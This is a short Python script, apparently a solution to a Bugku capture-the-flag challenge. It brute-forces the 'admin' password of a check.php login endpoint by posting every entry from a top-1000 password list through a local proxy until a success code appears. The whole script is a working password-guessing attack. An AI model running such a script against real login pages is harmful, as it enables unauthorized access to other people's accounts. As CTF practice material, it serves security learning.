import requests
s=requests.session()
proxy='127.0.0.1:8080'  #本地代理
proxies={
    'http':'http://'+proxy,
    'https':'https://'+proxy
}
header = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
    'Cookie':'security=medium; PHPSESSID=bdi0ak5mqbud69nrnejgf8q00u'
}
url="http://114.67.175.224:13142/check.php"
file_name = 'E:\\top1000.txt'
with open(file_name) as file_obj:
    for i in file_obj:
        payload={"username":"admin","password":i}
        r=requests.post(url,proxies=proxies,data=payload,headers=header)
        re=r.text
        print(i)
        if not(re.find("{code:'bugku10000'}")==-1):
            print("正确密码是:",i)
            break

        
